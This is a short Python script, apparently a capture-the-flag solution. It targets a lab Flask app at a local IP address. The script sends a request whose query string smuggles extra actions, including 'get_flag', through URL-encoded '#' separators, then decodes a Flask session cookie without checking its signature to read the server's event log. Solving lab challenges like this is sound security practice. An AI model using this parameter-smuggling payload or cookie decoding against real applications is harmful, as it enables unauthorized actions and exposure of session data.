#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/04/30, 15:07
"""

import sys
import zlib
import requests
from hashlib import *
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode


def decryption(payload):
    payload, sig = payload.rsplit('.', 1)
    payload, timestamp = payload.rsplit('.', 1)
    decompress = False
    if payload.startswith('.'):
        payload = payload[1:]
        decompress = True
    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode')
    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress')
    return session_json_serializer.loads(payload)


def get():
    # URL = 'http://localhost:8085'
    URL = 'http://192.168.48.130:8085'
    res = requests.get(
        URL+"/d5afe1f66147e857/?action:trigger_event%23;action:buy;7%23action:get_flag;")
    if res.status_code == 200:
        return res.headers
    return False


if __name__ == '__main__':
    headers = get()
    # session = headers['Set-Cookie'].split('=')[1].split(';')[0]
    # print(session)
    session = ".eJyNjt9rgzAcxP-Vkec-xGROFHzpQKFMpdI1yXeM4Y-uNZpUUNua4v8-KWwwuoe9Hdzd5-6KmuMeeW9X9JAjDwkW44y5Q6LTMWOlBr76BA5NrtcyIYEsw-aUy7Yqee3EY3wQNG1z8vgEZIs5gU6wwkHT4g6nVtZu09HZunPKpgxclYeBTs6-j6b3nzbo7SBMK3Nim5JZDafLU8ZsnJjC_4OkoQVeOHOiBr6_kX6DTBa69PslqMsBaGcJIs4RExQqqwa1vrxsUgXytU_CWEXPeIwkKCFrLExtR2bp_m8Y6UF9VP1OdcjDC9QeK93Pkk5f0Cd2XQ.YxR0wA.6lQhZmcvvNOdlGnwRF2qpVRmjSQ"
    de = decryption(session)
    print(de)
    # print([i for i in de['log'] if b'show_flag' in i][0][15:])
